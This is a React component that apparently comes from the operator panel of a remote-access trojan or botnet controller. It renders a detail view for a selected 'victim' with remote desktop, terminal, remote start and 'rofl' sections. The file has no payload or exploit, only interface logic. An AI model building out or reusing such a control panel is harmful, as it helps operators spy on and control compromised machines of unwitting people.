"use client";

import { useMemo } from "react";

import type { Victim } from "../../api/victims";
import { usePanelDetailView } from "./panel-detail-view-provider";
import { DetailSidebar } from "./detail-sidebar";
import { InformationSection } from "./sections/information-section";
import { RemoteStartSection } from "./sections/remote-start-section";
import { RemoteDesktopSection } from "./sections/remote-desktop-section";
import { RoflSection } from "./sections/rofl-section";
import { TerminalSection } from "./sections/terminal-section";

export function DetailView(props: { victims: Victim[] }) {
   const { victims } = props;
   const { isOpen, section, selectedVictimId, victimSnapshots } = usePanelDetailView();

   const victim = useMemo(() => {
      if (!selectedVictimId) return null;
      const id = String(selectedVictimId);
      const live = victims.find((v) => String(v.id ?? "") === id) ?? null;
      if (live) return live;
      return victimSnapshots && typeof victimSnapshots === "object" ? (victimSnapshots[id] ?? null) : null;
   }, [selectedVictimId, victimSnapshots, victims]);

   const isRemoteDesktop = section === "remote-desktop";

   if (!isOpen) return null;

   return (
      <div id="detailView" className="view h-full">
         <div
            id="detailViewInner"
            className={
               "relative grid h-full w-full grid-cols-[170px_1fr] bg-[#222222] " +
               (isRemoteDesktop ? "" : "")
            }
         >
            <DetailSidebar victim={victim} />

            <div
               className={
                  "detail-main overflow-y-visible border-l border-[rgba(120,120,120,0.6)] " +
                  (isRemoteDesktop ? "h-full min-h-0 overflow-hidden p-0" : "h-auto p-[12px_14px]")
               }
            >
               {section === "information" && <InformationSection victim={victim} />}
               {section === "remote-start" && <RemoteStartSection />}
               {section === "remote-desktop" && <RemoteDesktopSection />}
               {section === "rofl" && <RoflSection />}
               {section === "terminal" && <TerminalSection />}
            </div>
         </div>
      </div>
   );
}